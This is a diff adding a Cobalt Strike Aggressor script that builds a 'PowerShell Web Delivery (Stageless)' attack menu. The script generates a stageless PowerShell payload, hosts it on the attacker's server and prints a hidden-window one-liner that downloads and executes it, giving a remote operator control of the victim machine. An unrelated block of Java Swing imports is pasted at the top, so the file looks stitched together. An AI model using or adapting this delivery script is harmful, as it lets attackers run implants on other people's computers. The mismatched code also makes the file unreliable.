@@ -1,0 +1,76 @@
+# Scripted Web Delivery (Stageless)
+import java.awt.*; # for borderlayout
+import javax.swing.*; # for jpanel
+import javax.swing.table.*; #tablerowsorter
+import table.*; # generictablemodel
+import ui.*; #atable
+
+import java.awt.BorderLayout;
+import java.awt.EventQueue;
+
+import javax.swing.JFrame;
+import javax.swing.JPanel;
+import javax.swing.border.EmptyBorder;
+import java.awt.GridLayout;
+import javax.swing.JScrollPane;
+import javax.swing.JTextArea;
+import javax.swing.BoxLayout;
+import javax.swing.JList;
+import javax.swing.JButton;
+import javax.swing.SwingConstants;
+import java.awt.GridBagLayout;
+import java.awt.GridBagConstraints;
+import java.awt.Insets;
+import javax.swing.GroupLayout;
+import javax.swing.JLabel;
+import java.awt.FlowLayout;
+import javax.swing.JTable;
+
+# This script demonstrates some of the new APIs in Cobalt Strike 3.7.
+# setup our stageless PowerShell Web Delivery attack
+sub setup_attack {
+    local('%options $script $url $arch');
+    %options = $3;
+
+    # get the arch right.
+    $arch = iff(%options["x64"] eq "true", "x64", "x86");
+
+    # generate our stageless PowerShell script. We're going to make *this* function
+    # the callback for this call. That's why we yield after.
+    artifact_stageless(%options["listener"], "powershell", $arch, $null, $this);
+    yield;
+
+    # this function is now resumed after &artifact_stageless finished. $1 is our script.
+    $script = $1;
+
+    # host the script!
+    $url = site_host(%options["host"], %options["port"], %options["uri"], $script, "text/plain", "Scripted Web Delivery (powershell)"); 
+
+    # tell the user our URL
+    prompt_text("One-liner: ", "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('" . $url . "'))\"", {});
+}
+
+# create a popup menu!
+popup attacks {
+    item "PowerShell Web Delivery (S)" {
+        local('$dialog %defaults');
+
+        # setup our defaults
+        %defaults["uri"]  = "/a";
+        %defaults["host"] = localip();
+        %defaults["port"] = 80;
+
+        # create our dialog
+        $dialog = dialog("PowerShell Web Delivery (Stageless)", %defaults, &setup_attack);
+        dialog_description($dialog, "A stageless version of the PowerShell Web Delivery attack.");
+        drow_text($dialog, "uri", "URI Path: ", 20);
+        drow_text($dialog, "host", "Local Host: ");
+        drow_text($dialog, "port", "Local Port: ");
+        drow_listener_stage($dialog, "listener", "Listener: "); # can't gen stageless payloads for other team servers.
+        drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+        dbutton_action($dialog, "Launch");
+
+        # show our dialog
+        dialog_show($dialog);
+    }
+}
